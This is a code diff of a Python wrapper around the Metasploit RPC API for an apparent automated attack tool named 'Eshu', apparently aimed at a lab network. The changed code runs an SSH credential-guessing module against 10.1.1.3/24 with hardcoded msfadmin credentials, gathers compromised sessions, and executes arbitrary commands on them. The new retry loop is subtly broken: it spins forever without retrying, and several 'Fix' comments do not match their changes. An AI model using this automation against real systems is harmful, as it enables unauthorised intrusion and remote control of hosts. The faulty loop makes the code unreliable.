@@ -1,29 +1,29 @@
 import os
-import time
+import time  # Fix: Import time module
 import json
 import subprocess
-from pymetasploit3.msfrpc import MsfRpcClient
+from pymetasploit3.msfrpc import MsfRpcClient  # Fix: Import MsfRpcClient properly
+
 class Metasploit:
-    
-    def __init__(self, password, server='127.0.0.1', port=1337):
+    def __init__(self, password, Eshu, server="127.0.0.1", port=1337):
         self.name = "Metasploit API"
-        print(f"Starting {self.name}")
         self.start_msfconsole_with_script("/usr/src/metasploit-framework/docker/msfconsole.rc")
+        print(f"Starting {self.name}")
         while True:
-            try: 
-                self.client = MsfRpcClient(password, server=server, port=port)
-                break  # Successful connection
+            try:
+                self.client = MsfRpcClient(password, server=server, port=port)  # Fix: Ensure this import works
+                break
             except:
                 print("[!] Failed. Trying again...")
-                time.sleep(1)
+                time.sleep(0.5)
 
         print(f"[+] Successfully connected to MSF Server!")
-        self.targets = {}
+        self.eshu = Eshu
 
     def start_msfconsole_with_script(self, resource_script):
         """Start msfconsole with the specified resource script."""
         if not os.path.exists(resource_script):
-            print(f"[-] Resource script {resource_script} not found!")
+            print(f"[!] Resource script {resource_script} not found!")
             return
         
         print(f"[+] Starting msfconsole with resource script: {resource_script}")
@@ -33,39 +33,16 @@ class Metasploit:
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
             )
-            time.sleep(5)  # Allow time for msfconsole to initialize
+            time.sleep(0.5)  # Allow time for msfconsole to initialize
             print(f"[+] msfconsole started successfully!")
         except Exception as e:
             print(f"[!] Error starting msfconsole: {e}")
 
-    def save_session(self, framework_name, session_id):
-        hostID = f"{framework_name}{session_id}"
-        self.targets[hostID] = session_id
-
-    def save_session(self, framework_name, session_id):
-        hostID = f"{framework_name}{session_id}"
-        self.targets[hostID] = session_id
-
     def query_hosts(self):
 
-        run_exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-        run_exploit["RHOSTS"] = '10.1.1.3/24'
-        run_exploit["USERNAME"] = 'msfadmin'
-        run_exploit["PASSWORD"] = 'msfadmin'
-        run_exploit["THREADS"] = 5 
-
-        result = run_exploit.execute()
-        time.sleep(100)  # Allow time for the scan to run
-
-        if result.get("job_id"):
-            print("[+] Scan Complete!")
-        else:
-            print("[!] Scan failed. Retrying...")
-
+        """Retrieve all active sessions from Metasploit."""
         hosts = []
-        print("[+] Retrieving active sessions in Metasploit...")
-
-        # Loop through active sessions to gather information
+        print("Retrieving active sessions in Metasploit...")
         for session_id, session in self.client.sessions.list.items():
             host_info = {
                 "session_id": session_id,
@@ -75,77 +52,72 @@ class Metasploit:
                 "via_payload": session.get("via_payload", "N/A"),
             }
             hosts.append(host_info)
-            # Save the session to targets with the format "msf<session_id>"
-            self.save_session("msf", int(session_id))
-
-        print("[+] Active sessions retrieved:")
+            # Save host info to Eshu's targets
+            host_id = f"msf{session_id}"
+            self.eshu.save_session(host_id, host_info)
         if hosts:
+            print("[+] Active sessions retrieved:")
             for host in hosts:
-                print(f"Session ID {host['session_id']}: Target Host: {host['target_host']}, Platform: {host['platform']}")
+                print(f"\tSession ID {host['session_id']}: Target Host: {host['target_host']}, Platform: {host['platform']}")
         else:
-            print("[-] No active sessions.")
-
+            print("[!] No active sessions.")
         return hosts
 
-
     def send_cmd(self, id=None, os=None, commands=[]):
-        output = []
         if not id:
-            raise ValueError("[+] Host ID must be provided.")
+            raise ValueError("[!] Host ID must be provided.")
 
-        # Get session ID from targets mapping
-        session_id = self.targets.get(id)
+        # Retrieve the session information
+        session_info = self.eshu.targets.get(id)  # Retrieve host info
+        if not session_info:
+            raise ValueError(f"[!] Host ID {id} not found in targets.")
+
+        session_id = session_info.get("session_id")  # Get session ID from host info
         if not session_id:
-            raise ValueError(f"[+] Host ID {id} not found in targets.")
+            raise ValueError(f"[!] No session ID found for Host ID {id}.")
 
-        # Locate the session
+        # Retrieve the session from Metasploit
         session = self.client.sessions.list.get(str(session_id))
         if not session:
-            raise ValueError(f"[+] Session with ID {session_id} not found.")
+            raise ValueError(f"[!] Session with ID {session_id} not found.")
 
-        # Check OS/platform if provided, and skip check if platform is not available
-        session_platform = session.get('platform', 'N/A')
-        if os and session_platform != os and session_platform != 'N/A':
-            raise ValueError(f"[+] Session {session_id} is not running on the specified OS: {os}. It is on platform: {session_platform}.")
+        # Check OS compatibility if provided
+        session_platform = session.get("platform", "N/A")
+        if os and session_platform != os and session_platform != "N/A":
+            raise ValueError(f"[!] Session {session_id} is not running on the specified OS: {os}.")
 
-        # Run the command and collect output
+        # Execute commands
+        output = []
         for cmd in commands:
             try:
-                print(f"[+] Sent command {cmd} on target with id: {id}")
+                print(f"Sending command '{cmd}' to target with ID: {id}")
                 cmd_output = self.client.sessions.session(str(session_id)).run_with_output(cmd, end_strs=["$", "#", "\n"])
-                output.append(cmd_output)
-                print(f"[+] Successfully sent command, received output.")
+                output.append(f"Output for {cmd}: {cmd_output}")
+                print(f"[+] Successfully executed command: {cmd}")
             except Exception as e:
                 output.append(f"[!] Error executing command '{cmd}': {e}")
-
         return output
-    
+
     def list_exploit(self, module_type):
-        if not self.client:
-            raise ConnectionError("[-] Not connected")
-        return self.client.modules.search(module_type)
+       if not self.client:
+           raise ConnectionError("[!] Not connected")
+       return self.client.modules.search(module_type)
     
-    # def run_exploit(self, module_type, target_info = None):
-
-    #     if not target_info:
-    #         raise ValueError("[-] Target Information is required to run a scan")
+    def run_exploit(self, mtype, mname):
+        exploit = self.client.modules.use(mtype, mname)
+        exploit["RHOSTS"] = '10.1.1.3/24'
+        exploit["USERNAME"] = 'msfadmin'
+        exploit["PASSWORD"] = 'msfadmin'
+        exploit["THREADS"] = 5 
+        print(f"Running exploit: {exploit} with 1 second scan...")
+        result = exploit.execute()
+        print(result)
+        time.sleep(1)  # Allow time for the scan to run
         
-    #     while True:
-    #         #running exploit
-    #         if module_type == 'auxiliary':
-    #             print(module_name)
-    #         elif module_type == 'exploit':
-    #             print(module_name)
-    #         elif module_type == 'post':
-    #             print(module_name)
-    #         elif module_type == 'nop':
-    #             print(module_name)
-    #         elif module_type == 'encoder':
-    #             print(module_name)
-    #         elif module_type == 'payload':
-    #             print(module_name)
-    #         else:
-    #             raise ValueError(f"[-]  {module_type} is unknown module!")
-
-
-
+        while True:
+            if 'job_id' in result and result['job_id'] != 0:
+                print("[+] Scan Complete!")
+                time.sleep(1)
+                break
+            else:
+                print("[!] Scan failed. Retrying...")
